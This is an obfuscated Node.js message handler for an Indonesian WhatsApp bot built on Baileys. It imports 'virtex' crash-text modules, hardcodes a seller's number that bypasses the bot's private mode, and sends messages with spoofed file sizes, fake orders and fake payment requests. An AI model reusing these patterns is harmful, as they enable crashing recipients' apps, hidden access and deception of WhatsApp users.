// no enc buy 6281316643491

'use strict';

const {
  generateWAMessageFromContent,
  proto,
  prepareWAMessageMedia
} = require("baileys");
const toMs = require("ms");
const chalk = require("chalk");
const fs = require("fs");
const fse = require("fs-extra");
const moment = require("moment-timezone");
const util = require("util");
const {
  exec,
  spawn,
  execSync
} = require("child_process");
const axios = require("axios");
const speed = require("performance-now");
const ms = require("parse-ms");
const os = require("os");
const {
  join,
  dirname
} = require("path");
const path = require("path");
const fetch = require("node-fetch");
const cheerio = require("cheerio");
const {
  getDateId,
  resetLevelingXp,
  userXp,
  userLeveling,
  getLevelingXp,
  getLevelingLevel,
  getLevelingId,
  addLevelingXp,
  addLevelingLevel,
  addUserId
} = require("../lib/user");
const {
  msgFilter,
  addSpam,
  SpamExpired,
  cekSpam
} = require("../lib/antispam");
const {
  bad,
  thanks,
  ken,
  dosa,
  katamalem,
  katasiang,
  katasore,
  katalopyu,
  ohayo,
  devoloper1,
  teksspam,
  tekssalah,
  katara,
  katabot,
  katakawai,
  kataaii,
  ppTolak,
  ppLimit,
  badword
} = require("../message/messages");
const {
  vnToxic,
  vnMenu,
  vnSalam,
  vnAra,
  vnBot,
  vnSpam,
  vnPagi,
  vnSiang,
  vnMalam,
  vnOwner,
  vnKawai,
  vnLove
} = require("../message/autovn.js");
const {
  stikOtw,
  stikSpam,
  stikAdmin,
  stikTagOwn,
  stikBug
} = require("../message/autosticker.js");
const {
  color
} = require("../lib/color");
const {
  listCase,
  getCase,
  runtime,
  FileSize,
  h2k,
  isNumber,
  makeid,
  isUrl,
  fetchJson,
  getBuffer,
  generateProfilePicture
} = require("../lib/myfunc");
const {
  addblockcmd,
  deleteblockcmd,
  checkblockcmd
} = require("../lib/blockcmd");
const {
  addError,
  clearAllError,
  deleteError,
  checkError
} = require("../lib/totalerror");
const {
  Nothing,
  Failed,
  Succes,
  addAutoClear,
  autoClearChat,
  checkDataName,
  createDataId,
  addDataId,
  removeDataId,
  checkDataId,
  getHit,
  cmdAdd,
  expiredCmd
} = require("../lib/totalcmd");
const {
  cekBannedUser
} = require("../lib/banned");
const thumb = fs.readFileSync("./stik/thumb.jpeg");
global.thumb = thumb;
const {
  virtex,
  virtag,
  philip,
  emoji1,
  emoji2,
  virtex2,
  virtex3,
  virtex4,
  virtex5,
  virtex8,
  virtex9,
  virtex10,
  virtex11,
  virtex12,
  slayer,
  ngazap,
  virtexbytsukasa
} = require("../virtex/virtex.js");
const {
  virtex6
} = require("../virtex/virtex6.js");
const {
  virtex7
} = require("../virtex/virtex7.js");
let {
  dada
} = require("../message/sewabot.js");
const {
  register
} = require("./register.js");
const {
  settings
} = require("./settingsbot.js");
const {
  Logmessage,
  Logcommands,
  Logerror
} = require("./logger");
const AntiSpam = db.data.antispam;
const DataId = db.data.data;
const ban = db.data.banned;
const listcmdblock = db.data.blockcmd;
const listerror = db.data.listerror;
const hitnya = db.data.hittoday;
const dash = db.data.dashboard;
const anonChat = db.data.anonymous;
const allcommand = db.data.allcommand;
const sewa = db.data.sewa;
const _toxic = db.data.toxic;
const spammer = [];
module.exports = async (_0x5c8a1c, _0xb45cca, _0x3477fc, _0x5a5803, _0x1c1b0c) => {
  settings(_0xb45cca, isNumber);
  var _0x9fc6bc = db.data.settings.settingbot.publik;
  var _0x5ec400 = db.data.settings.settingbot.multi;
  var _0x496113 = db.data.settings.settingbot.prefix;
  var _0x48ecea = db.data.settings.settingbot.autoReport;
  var _0x1c8882 = db.data.settings.settingbot.autoSticker;
  var _0x23829f = db.data.settings.settingbot.replyType;
  var _0x57a03e = db.data.settings.settingbot.autoblockcmd;
  var _0x16afd0 = db.data.settings.settingbot.autoDetectCmd;
  var _0x185b7d = db.data.settings.settingbot.autoRead;
  var _0x4ddbaf = db.data.settings.settingbot.gcOnly;
  var _0x3bfe61 = "6281316643491@s.whatsapp.net";
  var _0x472e93 = [nomerOwner + "@s.whatsapp.net", "" + _0x5c8a1c.user.jid];
  const _0x4f5821 = (new Date() / 1000).toFixed(0);
  const _0x39ef8c = _0x4f5821 - _0xb45cca.messageTimestamp;
  if (_0x39ef8c > Intervalmsg) {
    return console.log("Pesan " + Intervalmsg + " detik yang lalu diabaikan agar tidak nyepam");
  }
  try {
    const {
      type: _0x251560,
      args: _0xe878d3,
      sender: _0xb5f31d,
      from: _0x284983,
      botNumber: _0xb9330d,
      senderNumber: _0x289dbe,
      groupName: _0xc7f74f,
      groupId: _0x4a2294,
      groupMembers: _0x1948d5,
      groupDesc: _0x37fe74,
      groupOwner: _0x22fe42,
      pushname: _0x224f61,
      itsMe: _0xfcd2a2,
      isGroup: _0x45f94f,
      mentionByTag: _0x5f3e7e,
      mentionByReply: _0x534be8,
      users: _0x4bbab5,
      budy: _0x1f6ab3,
      content: _0x2e6f45,
      body: _0x5d99f2
    } = _0xb45cca;
    let _0x10ce59;
    let _0x503d4f;
    if (_0x5ec400) {
      _0x10ce59 = /^(!|#|\.|\^|\\|¦)/.test(_0x5d99f2) ? _0x5d99f2.match(/^(!|#|\.|\^|\\|¦)/gi)[0] : _0x496113;
      _0x503d4f = "Multi Prefix";
    } else {
      _0x10ce59 = _0x496113;
      _0x503d4f = "Single Prefix";
    }
    const _0x5599a8 = _0x5d99f2.startsWith(_0x10ce59);
    const _0x5d4cf3 = _0x5599a8 ? _0x5d99f2.slice(_0x10ce59.length).trim().split(/ +/).shift().toLowerCase() : "";
    const _0x448b59 = _0xe878d3.join(" ");
    const _0xb6ca5a = moment().tz("Asia/Jakarta").format("HH:mm:ss");
    const _0x5a8dcd = _0x472e93.includes(_0xb5f31d) || checkDataId("owner", _0xb5f31d, DataId);
    const _0x451268 = _0x5a8dcd ? _0x5d99f2.replace(_0x10ce59, "").trim().split(/ +/).shift().toLowerCase() : _0x5d4cf3;
    const _0x259d69 = _0xb5f31d == _0x3bfe61;
    const _0x48068c = speed();
    const _0x59bcd6 = speed() - _0x48068c;
    const _0x38cde7 = _0xb45cca.quoted ? _0xb45cca.quoted : _0xb45cca;
    const _0x1ac680 = (_0x38cde7.msg || _0x38cde7).mimetype || "";
    const _0x39a073 = String.fromCharCode(8206);
    const _0x19e60d = _0x39a073.repeat(4001);
    const _0x2a197f = _0x448b59.replace(new RegExp("[()+-/ +/]", "gi"), "") + "@s.whatsapp.net";
    const _0x3d8bc6 = _0x5f3e7e && _0x5f3e7e[0] ? _0x5f3e7e[0] : _0x534be8 || _0x448b59 ? _0x2a197f : false;
    const _0x4184e7 = _0x5599a8 ? _0x5599a8 : allcommand.includes(toFirstCase(_0x451268));
    const _0x1421c3 = _0x251560 == "buttonsResponseMessage" ? _0xb45cca.message.buttonsResponseMessage.selectedButtonId : "";
    const _0x4298a6 = global.db.data.users[_0xb45cca.sender];
    const _0x588050 = _0x45f94f ? global.db.data.chats[_0xb45cca.chat] : false;
    const _0xf897bb = global.db.data.kickon[_0xb45cca.chat];
    const _0x350ef1 = global.db.data.others.runtime;
    const _0x1336c2 = _0x350ef1 ? new Date() - _0x350ef1.runtime : "Tidak terdeteksi";
    const _0x80dea2 = clockString(_0x1336c2);
    global.runTime = _0x80dea2;
    register(_0xb45cca, makeid, _0x5599a8, _0x5a8dcd, _0xc7f74f);
    const _0x1e3c35 = _0x45f94f ? await _0x5c8a1c.groupMetadata(_0xb45cca.chat).catch(_0x5e6bb2 => null) : null;
    const _0x6f3e75 = _0x1e3c35 ? _0x1e3c35.participants : [];
    const _0x172369 = _0x6f3e75.length ? _0x6f3e75.filter(_0x58b6c0 => _0x58b6c0.admin !== null).map(_0x4c8c22 => _0x4c8c22.id) : [];
    const _0x424997 = _0x45f94f ? _0x172369.includes(_0xb9330d) : false;
    const _0x25cfea = _0x45f94f ? _0xb45cca.isRAdmin : false;
    const _0x3744de = _0x45f94f ? _0xb45cca.isAdmin : false;
    const _0x9b25e9 = _0x45f94f ? db.data.chats[_0x284983].antilink : false;
    const _0x183b08 = _0x45f94f ? db.data.chats[_0x284983].antilinkgc : false;
    const _0x100884 = _0xb45cca.isGroup ? db.data.chats[_0xb45cca.chat].antipromosi : false;
    const _0x372e3f = _0xb45cca.isGroup ? db.data.chats[_0xb45cca.chat].antivideo : false;
    const _0xeb9964 = _0xb45cca.isGroup ? db.data.chats[_0xb45cca.chat].antisticker : false;
    const _0xfdcaaf = _0xb45cca.isGroup ? db.data.chats[_0xb45cca.chat].antispam : false;
    const _0x27a1c4 = _0xb45cca.isGroup ? db.data.chats[_0xb45cca.chat].antiimage : false;
    const _0x1c37e0 = _0xb45cca.isGroup ? db.data.chats[_0xb45cca.chat].antibot : false;
    const _0x58ce42 = _0xb45cca.isGroup ? db.data.chats[_0xb45cca.chat].antiaudio : false;
    const _0x4c143a = _0x45f94f ? db.data.chats[_0x284983].antiasing : false;
    const _0x470e9c = _0x45f94f ? db.data.chats[_0x284983].banchat : false;
    const _0x5462d5 = _0x45f94f ? db.data.chats[_0x284983].nsfw : false;
    const _0x47af2b = _0xb5f31d ? cekBannedUser(_0x289dbe, ban) : false;
    const _0x42b476 = _0x45f94f ? db.data.chats[_0x284983].simi : false;
    const _0x1271c1 = _0x45f94f ? db.data.chats[_0x284983].game : false;
    const _0x1c9257 = _0x5a8dcd ? true : db.data.users[_0xb5f31d].premiumTime !== 0;
    const _0x5dba24 = _0x1c9257 ? gcounti.prem : gcounti.user;
    const _0x16c21b = JSON.parse(fs.readFileSync("./database/reselerpanel.json"));
    const _0x185182 = _0x16c21b.includes(_0xb45cca.sender.replace("@s.whatsapp.net", ""));
    const _0x50bbcc = _0xb45cca.isGroup ? _0xb45cca.groupMembers.map(_0x28f293 => _0x28f293.id.split("@")[0]) : [];
    const _0x23df2d = db.data.settings.anticall?.anticulik || false;
    if (_0xb45cca.isGroup && _0x23df2d && _0x588050?.expired === 0 && !_0x50bbcc.includes(global.nomerOwner)) {
      if (global.session === ".session" || global.session === "sessions") {
        return;
      }
      try {
        await _0x5c8a1c.sendMessage(_0xb45cca.chat, {
          text: "\nGroup ini tidak terdaftar di dalam database order bot.\nSilakan order terlebih dahulu untuk menggunakan bot ini.\n\nHubungi owner: wa.me/" + global.nomerOwner + "\n            "
        });
        await sleep(2000);
        return _0x5c8a1c.groupLeave(_0xb45cca.chat);
      } catch (_0x51f87e) {
        console.error("Failed to process anticulik logic:", _0x51f87e);
      }
    }
    let _0x5bc072;
    if (_0xb6ca5a < "06:00:00") {
      _0x5bc072 = "🌅 Selamat pagi!";
    } else if (_0xb6ca5a < "11:00:00") {
      _0x5bc072 = "☀️ Selamat pagi!";
    } else if (_0xb6ca5a < "15:00:00") {
      _0x5bc072 = "🌞 Selamat siang!";
    } else if (_0xb6ca5a < "18:00:00") {
      _0x5bc072 = "🌇 Selamat sore!";
    } else if (_0xb6ca5a < "19:00:00") {
      _0x5bc072 = "🌙 Selamat malam!";
    } else {
      _0x5bc072 = "🌌 Selamat malam!";
    }
    let _0x3b2dfe = new Date(new Date() + 3600000);
    const _0x381389 = Intl.DateTimeFormat("id-TN-u-ca-islamic", {
      day: "numeric",
      month: "long",
      year: "numeric"
    }).format(_0x3b2dfe);
    try {
      var _0x150308 = await _0x5c8a1c.profilePictureUrl(_0xb5f31d, "image").catch(_0x17b6f3 => "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60");
    } catch (_0x15ebbe) {
      console.log(_0x15ebbe);
    }
    const _0x57d885 = await getBuffer(_0x150308);
    if (!_0x45f94f && _0x4ddbaf && !_0x5a8dcd && !_0x1c9257) {
      return;
    }
    if (!_0x9fc6bc && !_0xfcd2a2 && !_0x5a8dcd && !_0x259d69) {
      return;
    }
    if (_0x45f94f && !_0x1c9257 && !_0xb45cca.isAdmin && _0x470e9c && !_0xfcd2a2 && !_0x5a8dcd && !_0x9b25e9 && !_0x183b08 && !_0x100884 && !_0x372e3f && !_0xeb9964 && !_0xfdcaaf && !_0x27a1c4 && !_0x1c37e0 && !_0x58ce42) {
      return;
    }
    if (_0xb45cca.myButton) {
      return;
    }
    if (_0x185b7d) {
      _0x5c8a1c.readMessages([_0xb45cca.key]);
    }
    if (_0x5599a8) {
      _0x5c8a1c.sendPresenceUpdate("composing", _0x284983);
    } else {
      _0x5c8a1c.sendPresenceUpdate("available", _0x284983);
    }
    const _0x43e633 = _0x455973 => {
      return _0x455973[Math.floor(Math.random() * _0x455973.length)];
    };
    const _0x5a70e2 = (_0x44eb97, _0x1d4eb7, _0x1b3d85) => {
      if (_0x1b3d85 == null || _0x1b3d85 == undefined || _0x1b3d85 == false) {
        _0x5c8a1c.sendMessage(_0x284983, {
          text: _0x44eb97,
          mentions: _0x1d4eb7,
          contextInfo: {
            mentionedJid: _0x1d4eb7
          }
        });
      } else {
        _0x5c8a1c.sendMessage(_0x284983, {
          mentions: _0x1d4eb7,
          text: _0x44eb97,
          contextInfo: {
            mentionedJid: _0x1d4eb7
          }
        }, {
          quoted: _0xb45cca
        });
      }
    };
    const _0x501453 = _0x5253c2 => {
      return Math.floor(_0x5253c2);
    };
    const _0xe6c47b = _0x4298a6 ? db.data.users[_0xb45cca.sender].level : true;
    const _0x499a84 = _0x4298a6 ? db.data.users[_0xb45cca.sender].exp : true;
    const _0x156691 = _0x4298a6 ? db.data.users[_0xb45cca.sender].id : true;
    const _0x4584c5 = Math.floor(Math.random() * 10) + 50;
    const _0x2c2193 = _0xe6c47b * 10000;
    const _0x237104 = _0x499a84 / _0x2c2193 * 100;
    const _0xe5ab6d = _0x4298a6 ? db.data.users[_0xb45cca.sender].date : true;
    require("./alfake.js")(_0xb45cca, _0x224f61, _0xb5f31d, _0x5bc072, _0x5d99f2);
    const _0x5f160b = async (_0x1679ee, _0x25106b) => {
      const {
        translate: _0x31dad9
      } = require("@vitalets/google-translate-api");
      let _0x5a68cd = String(_0xb5f31d || "");
      let _0x5db05b;
      if (_0x5a68cd.startsWith("62")) {
        _0x5db05b = "id";
      } else if (_0x5a68cd.startsWith("1")) {
        _0x5db05b = "en";
      } else if (_0x5a68cd.startsWith("63")) {
        _0x5db05b = "fil";
      } else if (_0x5a68cd.startsWith("81")) {
        _0x5db05b = "ja";
      } else if (_0x5a68cd.startsWith("49")) {
        _0x5db05b = "de";
      } else if (_0x5a68cd.startsWith("55")) {
        _0x5db05b = "pt";
      } else {
        _0x5db05b = "en";
      }
      let _0x9b6659;
      if (_0x5db05b === "en") {
        _0x9b6659 = _0x1679ee;
      } else {
        try {
          const _0x48449f = await _0x31dad9(_0x1679ee, {
            to: _0x5db05b
          });
          _0x9b6659 = _0x48449f.text;
        } catch (_0x3125bb) {
          _0x9b6659 = _0x1679ee;
        }
      }
      const _0x118e00 = ["https://telegra.ph/file/bccaedbff01a994692111.jpg", "https://raw.githubusercontent.com/Renzofficial/Uploade/main/uploader/1736642075253.jpg", "https://raw.githubusercontent.com/Renzofficial/Uploade/main/uploader/1736641997912.jpg", "https://raw.githubusercontent.com/Rangelofficial/Uploade-db/main/uploader/1735497794395.jpg"];
      const _0x4b30fb = _0x118e00[Math.floor(Math.random() * _0x118e00.length)];
      let _0x197a69 = {
        mentionedJid: [_0xb5f31d],
        forwardingScore: 9999999,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
          newsletterJid: newsletterJid,
          serverMessageId: 100,
          newsletterName: newsletterName
        },
        externalAdReply: {
          showAdAttribution: true,
          title: "Mᴇɴʜᴇʀᴀ Mᴅ 𝟼.𝟻.𝟶",
          body: "Runtime " + transformText(_0x80dea2),
          previewType: "PHOTO",
          thumbnailUrl: _0x4b30fb
        }
      };
      if (_0x23829f === "web") {
        _0x5c8a1c.sendMessage(_0x284983, {
          contextInfo: _0x197a69,
          text: transformText(_0x9b6659)
        }, {
          quoted: _0xb45cca
        });
      } else if (_0x23829f === "web2") {
        _0x5c8a1c.sendMessage(_0x284983, {
          contextInfo: {
            externalAdReply: {
              showAdAttribution: true,
              mediaType: 3,
              renderLargerThumbnail: false,
              thumbnailUrl: _0x4b30fb,
              sourceUrl: "https://wa.me/" + nomerOwner + "?text=Hallo+kak"
            }
          },
          text: _0x9b6659
        }, {
          quoted: _0xb45cca
        });
      } else if (_0x23829f === "mess") {
        _0x5c8a1c.sendMessage(_0x284983, {
          id: _0xb45cca.key.id,
          contextInfo: {
            forwardingScore: 50,
            isForwarded: true
          },
          showAdAttribution: true,
          text: _0x9b6659
        }, {
          quoted: _0xb45cca
        });
      } else if (_0x23829f === "katalog") {
        const {
          generateWAMessageFromContent: _0x57bd0c
        } = require("baileys");
        let _0x2a423c = _0x57bd0c(_0xb45cca.chat, {
          orderMessage: {
            itemCount: 20000,
            status: 50000,
            surface: 999,
            message: Ehztext(_0x9b6659),
            description: "^^",
            orderTitle: "ʙᴇᴊɪʀ ᴅᴇᴋ",
            productId: "8383179131783124",
            retailerId: "Menhera ( cjs )",
            mediaType: 1,
            curreyCode: "IDR",
            id: "746FD84806714E506605D655D52A9427",
            totalCurrencyCode: 20,
            totalAmount1000: "50000",
            businessOwnerJid: "6285795718659@s.whatsapp.net",
            thumbnail: thumb,
            sourceUrl: "https://wa.me/p/8383179131783124/6285795718659"
          }
        }, {
          contextInfo: _0xb45cca.mentionJid,
          quoted: _0xb45cca
        });
        _0x5c8a1c.relayWAMessage(_0x2a423c);
      } else if (_0x23829f === "document") {
        _0x5c8a1c.sendMessage(_0xb45cca.chat, {
          document: fs.readFileSync("./package.json"),
          fileName: "© Rangelofficial",
          mimetype: "application/vnd.ms-excel",
          fileLength: 999999999,
          bpageCount: 10903,
          caption: Ehztext(_0x9b6659),
          contextInfo: {
            mentionedJid: [_0xb5f31d],
            forwardingScore: 9999999,
            isForwarded: true,
            externalAdReply: {
              showAdAttribution: false,
              title: botName,
              body: _0x5bc072 + " kak " + _0x224f61,
              thumbnailUrl: _0x4b30fb,
              mediaType: 1,
              sourceUrl: "" + web
            }
          }
        }, {
          quoted: _0xb45cca,
          ephemeralExpiration: 86400
        });
      } else {
        _0xb45cca.reply("tidak di temukan silahkan periksa lagi");
      }
    };
    const _0x357d03 = _0xa0f910 => {
      _0x5c8a1c.sendMessage(_0x284983, {
        contextInfo: {
          forwardingScore: 50,
          isForwarded: true
        },
        showAdAttribution: true,
        text: _0xa0f910
      }, {
        quoted: _0xb45cca
      });
    };
    const _0x3d461a = _0x252ed3 => {
      _0x5c8a1c.sendMessage(_0x284983, {
        audio: {
          url: _0x252ed3
        },
        ptt: true,
        waveform: [0, 0, 50, 0, 0, 0, 10, 80, 10, 60, 10, 99, 60, 30, 10, 0, 0, 0],
        mimetype: "audio/mpeg",
        forwardedNewsletterMessageInfo: {
          newsletterJid: newsletterJid,
          serverMessageId: 100,
          newsletterName: newsletterName
        }
      }, {
        quoted: _0xb45cca
      });
    };
    const _0x65403f = (_0x3eaad6, _0xa938be) => {
      _0x5c8a1c.sendMessage(_0x284983, {
        audio: {
          url: _0x3eaad6
        },
        mimetype: "audio/mpeg",
        ptt: true,
        contextInfo: {
          forwardingScore: 9999,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: newsletterJid,
            serverMessageId: 20,
            newsletterName: newsletterName
          }
        }
      }, {
        quoted: _0xa938be
      });
    };
    const _0x397050 = _0x43e57d => {
      _0x5c8a1c.sendMessage(_0x284983, {
        sticker: {
          url: _0x43e57d
        }
      }, {
        quoted: _0xb45cca
      });
    };
    const _0x5d5c7b = _0x217ec6 => {
      _0x5c8a1c.sendMessage(_0xb45cca.chat, {
        react: {
          text: _0x217ec6,
          key: _0xb45cca.key
        }
      });
    };
    const _0x2431e9 = (_0x1f0058, _0x8c456f) => {
      _0x5c8a1c.sendMessage(_0x284983, {
        video: _0x1f0058,
        caption: "Nih!",
        gifPlayback: true
      }, {
        quoted: _0xb45cca
      });
    };
    const _0x40c64e = (_0x9a6de7, _0x2b51de) => {
      let _0xfd58e7 = {
        forwardingScore: 99999,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
          newsletterJid: newsletterJid,
          serverMessageId: 100,
          newsletterName: newsletterName
        },
        externalAdReply: {
          showAdAttribution: true,
          renderLargerThumbnail: true,
          title: "" + transformText("Menhera -Md 6.5.0"),
          body: "Runtime " + transformText(_0x80dea2),
          sourceUrl: web,
          mediaType: 1,
          containsAutoReply: true,
          thumbnailUrl: _0x9a6de7
        }
      };
      _0x5c8a1c.sendMessage(_0x284983, {
        contextInfo: _0xfd58e7,
        text: _0x2b51de
      }, {
        quoted: _0xb45cca
      });
    };
    const _0x1e9c47 = async _0x115430 => {
      _0x5c8a1c.sendMessage(_0xb45cca.chat, {
        document: fs.readFileSync("./package.json"),
        fileName: _0x224f61,
        fileLength: 99999999999999,
        mimetype: "application/pdf",
        jpegThumbnail: fs.readFileSync("./stik/menhera.jpg"),
        caption: _0x115430,
        contextInfo: {
          showAdAttribution: true,
          forwardingScore: 10,
          isForwarded: true,
          mentionedJid: [_0xb45cca.sender],
          businessMessageForwardInfo: {
            businessOwnerJid: "62831234487088@s.whatsapp.net"
          },
          forwardedNewsletterMessageInfo: {
            newsletterJid: newsletterJid,
            serverMessageId: null,
            newsletterName: newsletterName
          }
        }
      }, {
        quoted: _0xb45cca,
        ephemeralExpiration: 86400
      });
    };
    const _0x36233b = _0x10a12d => {
      let _0x756127 = {
        url: _0x43e633(fotoRandom),
        type: "image/jpeg"
      };
      let _0x4a66bd = "https://www.youtube.com/@rangelbot";
      let _0x110c5d = {
        externalAdReply: {
          showAdAttribution: false,
          renderLargerThumbnail: false,
          title: "⇆ㅤ ||◁ㅤ❚❚ㅤ▷||ㅤ ↻",
          body: "   ━━━━⬤──────────    ",
          description: "Now Playing ....",
          mediaType: 2,
          thumbnailUrl: _0x756127.url,
          mediaUrl: _0x4a66bd
        }
      };
      _0x5c8a1c.sendMessage(_0x284983, {
        contextInfo: _0x110c5d,
        mimetype: "audio/mp4",
        audio: _0x10a12d
      }, {
        quoted: _0xb45cca
      });
    };
    const _0x491d70 = _0x7d3183 => {
      let _0x521ca5 = {
        mentionedJid: [_0xb5f31d],
        externalAdReply: {
          forwardingScore: 999,
          isForwarded: true,
          title: transformText("" + _0xb45cca.pushname),
          body: transformText(week + "," + calender),
          mediaType: 2,
          thumbnail: _0x57d885,
          mediaUrl: "" + syt
        }
      };
      _0x5c8a1c.sendMessage(_0x284983, {
        contextInfo: _0x521ca5,
        text: _0x7d3183 + "\n" + _0x19e60d + ("\n⫹⫺ @" + _0xb5f31d.split("@")[0] + "\n⫹⫺ " + week + " , " + calender)
      }, {
        quoted: _0xb45cca
      });
    };
    const _0x11ad76 = async () => {
      let _0x2e7337 = _0xb5f31d.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
      let _0x3339cf = transformText("👤 *Hai:* @" + _0x2e7337.split("@")[0] + "\nSepertinya Anda belum terdaftar dalam database anggota kami. Dengan bergabung, Anda akan mendapatkan akses ke fitur eksklusif dan pengalaman terbaik yang kami tawarkan! 💫\n\n📝 *Format Pendaftaran:*\n1. Jika ingin mendaftar dengan email:  \n   *.daftar email,nama,umur*  \n   Contoh: *.daftar example@gmail.com,John,25*\n\n2. Jika tanpa email:  \n   *.daftar nama,umur*  \n   Contoh: *.daftar John,25*");
      _0x5d5c7b("❌");
      await _0x491d70(_0x3339cf);
    };
    _0x5c8a1c.editmsg = async (_0x413361, _0x17efe1) => {
      var _0x485157 = [_0x413361 + ".", _0x413361 + "..", _0x413361 + "...", _0x413361 + "....", "" + _0x17efe1];
      let {
        key: _0x57aaaa
      } = await _0x5c8a1c.sendMessage(_0xb45cca.chat, {
        text: _0x413361
      });
      for (let _0x5b1e6d = 0; _0x5b1e6d < _0x485157.length; _0x5b1e6d++) {
        await _0x5c8a1c.sendMessage(_0xb45cca.chat, {
          text: _0x485157[_0x5b1e6d],
          edit: _0x57aaaa
        });
      }
    };
    const _0x56468a = vnToxic;
    const _0xf322bb = _0x56468a[Math.floor(Math.random() * _0x56468a.length)];
    const _0x3ca8c3 = vnMenu;
    const _0x5858a5 = _0x3ca8c3[Math.floor(Math.random() * _0x3ca8c3.length)];
    const _0x335059 = vnBot;
    const _0x3140c1 = _0x335059[Math.floor(Math.random() * _0x335059.length)];
    const _0x11c3c9 = vnPagi;
    const _0x52ba54 = _0x11c3c9[Math.floor(Math.random() * _0x11c3c9.length)];
    const _0x500de1 = vnSiang;
    const _0x48a1a2 = _0x500de1[Math.floor(Math.random() * _0x500de1.length)];
    const _0x541a2d = vnMalam;
    const _0x5b5a4b = _0x541a2d[Math.floor(Math.random() * _0x541a2d.length)];
    const _0x4f20f1 = vnOwner;
    const _0x491952 = _0x4f20f1[Math.floor(Math.random() * _0x4f20f1.length)];
    const _0xd507f7 = vnSpam;
    const _0x2338c0 = _0xd507f7[Math.floor(Math.random() * _0xd507f7.length)];
    const _0x496569 = vnSalam;
    const _0x59789a = _0x496569[Math.floor(Math.random() * _0x496569.length)];
    const _0x586b35 = vnLove;
    const _0x2e29dc = _0x586b35[Math.floor(Math.random() * _0x586b35.length)];
    const _0x32c36e = vnAra;
    const _0x22bd9a = _0x32c36e[Math.floor(Math.random() * _0x32c36e.length)];
    const _0x21e7c3 = vnKawai;
    const _0x47938a = _0x21e7c3[Math.floor(Math.random() * _0x21e7c3.length)];
    const _0x3735a5 = stikOtw;
    const _0x1f5ab6 = _0x3735a5[Math.floor(Math.random() * _0x3735a5.length)];
    const _0x43bdf2 = stikSpam;
    const _0x50df00 = _0x43bdf2[Math.floor(Math.random() * _0x43bdf2.length)];
    const _0x35a6ee = stikTagOwn;
    const _0x4fccb7 = _0x35a6ee[Math.floor(Math.random() * _0x35a6ee.length)];
    const _0x45bffe = teksspam;
    const _0xcc5207 = _0x45bffe[Math.floor(Math.random() * _0x45bffe.length)];
    const _0x1d17b7 = async () => {
      let _0x30bf83 = "Maaf " + _0x224f61 + ", fitur ini hanya tersedia untuk Owner. Terima kasih atas pengertiannya 🙏";
      _0x5d5c7b("❌");
      _0x1e9c47(_0x30bf83);
    };
    const _0x23ea05 = async () => {
      let _0x231fd5 = "Maaf " + _0x224f61 + ", fitur ini khusus untuk Admin. Terima kasih atas pengertiannya 🙏";
      _0x5d5c7b("❌");
      _0x1e9c47(_0x231fd5);
    };
    const _0x3c032d = async () => {
      let _0x46d5ef = "HAI " + _0x224f61 + " Silakan Jadikan " + botName + " Admin Terlebih Dahulu Agar Bisa Memakai Fitur Tersebut";
      _0x5d5c7b("❌");
      _0x1e9c47(_0x46d5ef);
    };
    const _0x12931b = async () => {
      let _0x5319fd = Ehztext("Hallo " + _0x224f61 + "\nFitur Hanya Untuk User Premium Silahkan Upgrade ke Premium Untuk Menggunakan Fitur Ini dengan Cara *.buyprem*");
      _0x5d5c7b("❌");
      _0x1e9c47(_0x5319fd);
    };
    const _0x1ace2b = async () => {
      let _0x14ecd9 = Ehztext("*⚠️ Limit Habis - Akses Dibatasi*\n    Maaf, kak @" + _0xb5f31d.split("@")[0] + ", limit kamu sudah habis. Silakan cek limit dengan perintah *.ceklimit*, atau klaim limit baru dengan perintah *.claim*. \n    Untuk membeli tambahan limit, gunakan perintah *.shopc* 🛒. Terima kasih!");
      _0x5d5c7b("❌");
      _0x1e9c47(_0x14ecd9);
    };
    const _0x281fa4 = async () => {
      _0x5d5c7b("❌");
      let _0x2da483 = Ehztext("*乂 Limit - Expired*\nMaaf kak @" + _0xb5f31d.split("@")[0] + " limit game kamu sudah habis! silakan cek limit");
      _0x1e9c47(_0x2da483);
    };
    const _0x2a7e47 = async () => {
      let _0x116af6 = Ehztext("Hai " + _0x224f61 + " command Ini Hanya Bisa Di Aksess Di Private Chat Bot");
      _0x5d5c7b("❌");
      _0x1e9c47(_0x116af6);
    };
    const _0x4e17f4 = async () => {
      let _0x695519 = "\n👥 *Info*\n┌ ◦ Nama: " + _0x224f61 + "\n╰ ◦ Saldo: Rp\n\n🕒 *Tanggal & Waktu* \n┌ ◦ " + week + ", " + calender + "\n╰ ◦ " + _0x381389 + "\n\nSelamat datang di akun resmi Rangelofficial!\nKami dengan bangga memperkenalkan layanan unggulan kami yang dapat Anda nikmati secara privat.\nNikmati fitur-fitur eksklusif yang hanya dapat diakses melalui percakapan pribadi ini.\n\nUntuk akses lebih lanjut dan berinteraksi dengan komunitas, silakan bergabung dengan grup bot resmi kami di [ *.gcrangel* ].\n\n" + _0x19e60d + "\n" + menuprivate(_0x10ce59) + "\n";
      let _0x297d80 = ["7.76", "15.48", "8.92", "10.72", "13.48", "4.39", "5.99", "20.5600"];
      let _0x20a0a5 = _0x297d80[Math.floor(Math.random() * _0x297d80.length)];
      _0x5c8a1c.relayMessage(_0xb45cca.chat, {
        requestPaymentMessage: {
          expiryTimestamp: 0,
          currencyCodeIso4217: "IDR",
          amount1000: _0x20a0a5 * 1000,
          requestFrom: _0xb45cca.sender.split("@")[0] + "@s.whatsapp.net",
          noteMessage: {
            extendedTextMessage: {
              text: Ehztext(_0x695519),
              contextInfo: {
                mentionedJid: [_0xb45cca.sender],
                externalAdReply: {
                  showAdAttribution: true
                }
              }
            }
          }
        }
      }, {});
    };
    async function _0x38efb8() {
      let _0x5d809e = ["🕛", "🕒", "💦"];
      let _0x509eac = 0;
      let _0x2fd1df = setInterval(async () => {
        if (_0x509eac < _0x5d809e.length) {
          await _0x5c8a1c.sendMessage(_0x284983, {
            react: {
              text: _0x5d809e[_0x509eac],
              key: _0xb45cca.key
            }
          });
          _0x509eac++;
        } else {
          clearInterval(_0x2fd1df);
        }
      }, 1000);
    }
    require("./listmenu.js");
    require("./message.js")(_0x289dbe, _0x10ce59, _0x451268, _0x1e9c47);
    let _0x4a77e3 = ["red", "white", "black", "blue", "yellow", "green", "magenta", "cyan", "pink", "gold", "purple", "navy", "gray"];
    const _0x32d9af = _0x251560 === "extendedTextMessage" && _0x2e6f45.includes("imageMessage");
